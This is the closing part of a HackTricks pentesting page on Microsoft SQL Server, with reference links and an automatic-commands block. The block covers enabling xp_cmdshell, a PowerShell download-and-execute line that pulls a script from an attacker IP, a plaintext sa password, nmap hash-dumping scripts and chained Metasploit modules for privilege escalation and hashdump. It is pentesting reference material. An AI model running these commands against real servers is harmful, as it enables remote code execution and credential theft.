- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)


- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?\_x_tr_sl=es&\_x_tr_tl=en&\_x_tr_hl=en&\_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)

## HackTricks automatische Befehle
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
